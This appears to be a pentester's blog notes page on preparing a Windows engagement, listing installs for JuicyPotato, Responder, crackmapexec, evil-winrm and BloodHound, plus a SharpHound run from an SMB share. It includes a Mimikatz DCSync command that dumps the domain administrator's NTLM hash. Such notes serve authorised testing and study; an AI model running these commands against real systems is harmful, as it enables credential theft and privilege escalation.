---
title: 1. Preparation - Windows
categories:
  - Pentesting
  - Windows
tags:
  - Pentesting
  - Windows
  - Preparation
toc: true
---

---
Step 1 in a penetration test: Preparation.
Install the necessary tools, prepare scripts and the working environment.

---
<!-- more -->

<br>

```bash Create a dedicated directory (stay organized)
mkdir -p ~/tools
```

## Pentesting tools
```bash JuiciPotato.exe - privesc from service acc to system
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe ~/tools/JuicyPotato.exe
```

```bash Responder
sudo apt install responder
```

```bash crackmapexec - Swiss Army knife for Win/AD environments
sudo apt install crackmapexec
```

```bash evilwinrm - WinRM shell
sudo apt install evil-winrm
```

<br> 

BloodHound and SharpHound
```bash BloodHound
sudo apt install neo4j

neo4j start
# fresh start (or forgotten password)
sudo rm -rf /usr/share/neo4j/data/dbms/auth
neo4j console
```
```batch collect data with SharpHound (maybe share the binary in a SMB share)
\\10.10.10.10\share> .\SharpHound.exe
```
```bash Import the zip archive created into BloodHound
...
```

<br>

```bash Mimikatz
# download the latest release and upload the 64-bit binary 
# https://github.com/gentilkiwi/mimikatz/releases/latest

.\mimikatz 'lsadump::dcsync /domain:DOMAIN.LOCAL /user:administrator' exit
# NTLM hash
```

<br>

## Other tools
```batch sqlcmd (windows)
winget install sqlcmd
```

<br>

---
---